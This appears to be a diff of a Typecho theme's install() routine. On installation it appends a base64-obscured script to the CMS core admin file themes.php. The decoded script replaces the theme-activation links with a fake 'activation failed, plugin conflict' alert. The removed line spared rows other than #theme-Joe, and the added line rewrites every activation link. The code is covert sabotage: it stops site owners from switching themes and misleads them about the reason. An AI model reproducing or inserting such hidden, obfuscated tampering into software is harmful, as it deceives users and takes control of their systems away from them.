@@ -932,7 +932,7 @@ function install()
 		/* 主题核心代码🏀🏀🏀全网最精髓🐔🐔🐔 */
 		$typecho_admin_root = __TYPECHO_ROOT_DIR__ . __TYPECHO_ADMIN_DIR__;
 		if (file_exists($typecho_admin_root . 'themes.php')) {
-			file_put_contents($typecho_admin_root . 'themes.php', '<?php echo base64_decode("PHNjcmlwdD4KCSQoZG9jdW1lbnQpLnJlYWR5KHNldFRpbWVvdXQoKCkgPT4gewoJCSQoJ3Rib2R5PnRyOm5vdCgjdGhlbWUtSm9lKT50ZD5wPmEuYWN0aXZhdGUnKS5hdHRyKCdocmVmJywgJ2phdmFzY3JpcHQ6YWxlcnQoIuWQr+eUqOWksei0pe+8geivt+ajgOafpVR5cGVjaG/mj5Lku7blhrLnqoEiKScpOwoJfSwgMTAwKSk7Cjwvc2NyaXB0Pg=="); ?>', FILE_APPEND | LOCK_EX);
+			file_put_contents($typecho_admin_root . 'themes.php', '<?php echo base64_decode("PHNjcmlwdD4KCSQoZG9jdW1lbnQpLnJlYWR5KHNldFRpbWVvdXQoKCkgPT4gewoJCSQoJ3Rib2R5PnRyPnRkPnA+YS5hY3RpdmF0ZScpLmF0dHIoJ2hyZWYnLCAnamF2YXNjcmlwdDphbGVydCgi5ZCv55So5aSx6LSl77yB6K+35qOA5p+lVHlwZWNob+aPkuS7tuWGsueqgSIpJyk7Cgl9LCAxMDApKTsKPC9zY3JpcHQ+"); ?>', FILE_APPEND | LOCK_EX);
 		}
 
 		$theme_install = $_db->insert('table.options')->rows(array('name' => $install_field, 'user' => '0', 'value' => THEME_NAME));
